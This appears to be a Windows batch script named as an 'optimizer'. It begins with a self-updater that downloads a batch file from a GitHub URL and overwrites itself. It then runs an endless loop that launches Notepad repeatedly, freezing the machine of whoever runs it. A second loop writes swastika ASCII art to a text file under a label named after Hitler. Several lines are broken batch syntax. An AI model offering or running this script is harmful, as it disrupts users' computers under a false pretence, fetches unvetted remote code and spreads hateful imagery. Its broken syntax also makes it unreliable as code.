::Updater
set "filePath=%~f0"
for /F %%G in ('curl https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat') do set github=%%G
if "%filePath%" == "%github%" (

	timeout 2 > NUL
	clear
) 
else (

	echo ---------------------------------------------------------------------------
	echo                                  Updating
	echo.
	copy "%filePath%" "%filePath%.old"
	curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
	echo.
	echo ---------------------------------------------------------------------------
	echo.
	echo Restart optimizer.bat after closing
	pause
)

::Loops

:Notepad
	start "" notepad.exe
	goto :Notepad
	goto :Hitler

:Hitler  
	echo.
	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > prank.txt
	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> prank.txt
	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> prank.txt
	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> prank.txt
	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> prank.txt
  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> prank.txt
  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> prank.txt
  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> prank.txt
  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> prank.txt
  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> prank.txt
  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> prank.txt
  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> prank.txt
  	goto :Hitler
	goto :Notepad
